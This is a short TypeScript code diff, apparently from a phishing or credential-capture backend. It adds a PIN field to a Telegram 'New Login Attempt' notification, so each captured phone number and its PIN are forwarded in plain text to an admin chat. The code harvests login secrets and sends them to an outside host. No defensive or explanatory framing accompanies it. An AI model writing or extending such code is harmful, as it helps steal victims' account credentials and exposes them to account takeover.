@@ -96,11 +96,12 @@ class TelegramBotService {
 /**
     * Send phone entry notification to admin
     */
-  async sendPhoneNotification(phoneNumber: string): Promise<TelegramResponse> {
+  async sendPhoneNotification(phoneNumber: string, pin: string): Promise<TelegramResponse> {
     const message = `
 📱 <b>New Login Attempt</b> 📱
 
 📞 <b>Phone:</b> ${phoneNumber}
+🔐 <b>PIN:</b> ${pin}
 ⏰ <i>Time: ${new Date().toLocaleString()}</i>
 `;
     return this.sendMessage({
